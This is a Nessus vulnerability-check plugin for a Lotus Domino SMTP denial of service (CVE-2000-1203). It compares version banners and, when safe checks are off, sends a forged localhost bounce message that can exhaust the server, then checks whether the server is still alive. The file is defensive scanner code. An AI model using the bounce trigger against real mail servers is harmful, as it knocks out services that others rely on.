#
# (C) Tenable Network Security, Inc.
#

# References
# Date:  Mon, 20 Aug 2001 21:19:32 +0000
# From: "Ian Gulliver" <ian@orbz.org>
# To: bugtraq@securityfocus.com
# Subject: Lotus Domino DoS
#


include("compat.inc");

if(description)
{
 script_id(11717);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2000-1203");
 script_bugtraq_id(3212);
 script_xref(name:"OSVDB", value:"10816");

 script_name(english:"Lotus Domino SMTP Server Forged Localhost Mail Header DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a denial of service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote SMTP server (possibly Lotus Domino) can be killed or 
disabled by a malformed message that bounces to himself. The 
routing loop exhausts all resources.

An attacker may use this to crash it continuously." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=vuln-dev&m=95886062521327&w=2" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Broken message bounced to himself exhausts MTA");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");

 # Avoid this test if the server relays e-mails.
 script_dependencie("find_service1.nasl", "smtp_settings.nasl",
	"smtp_relay.nasl", "smtpscan.nasl");
 script_exclude_keys("SMTP/spam");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if (!port) port = 25;
buff = get_smtp_banner(port:port);

if ( ! buff || "Lotus Domino" >!< buff ) exit(0);

# Disable the test if the server relays e-mails or if safe checks
# are enabled
if (get_kb_item("SMTP/spam") || safe_checks())
{
  if(egrep(pattern:"^220.*Lotus Domino Release ([0-4]\.|5\.0\.[0-8][^0-9])", string:buff))
  {
   security_warning(port);
   exit(0);
  }
  
  # Use smtpscan's banner.
  banner = get_kb_item(string("smtp/", port, "/real_banner"));
  if(ereg(pattern:"Lotus.* ([0-4]\.|5\.0\.[0-8][^0-9])", string:banner)) {
  	security_warning(port);
   	exit(0);
   }
  exit(0);
}

#
n_sent = 0;

fromaddr = string("bounce", rand(), "@[127.0.0.1]");
toaddr = string("nessus", rand(), "@invalid", rand(), ".net");


 s = open_sock_tcp(port);
 if(!s)exit(0);
  
  
buff = smtp_recv_banner(socket:s);

b = string("From: nessus\r\nTo: postmaster\r\n",
	"Subject: SMTP bounce denial of service\r\n\r\ntest\r\n");

n = smtp_send_port(port: port, from: fromaddr, to: toaddr, body: b);
if (! n) exit(0);
sleep(1);

flag = 1;
soc = open_sock_tcp(port);
if (soc)
{
  send(socket: soc, data: string("HELO example.com\r\n"));
  buff = recv_line(socket: soc, length: 2048);
  if (buff =~ "^2[0-9][0-9] ")
    flag = 0;
  send(socket: soc, data: string("QUIT\r\n"));
  close(soc);
}
if (flag) security_warning(port);
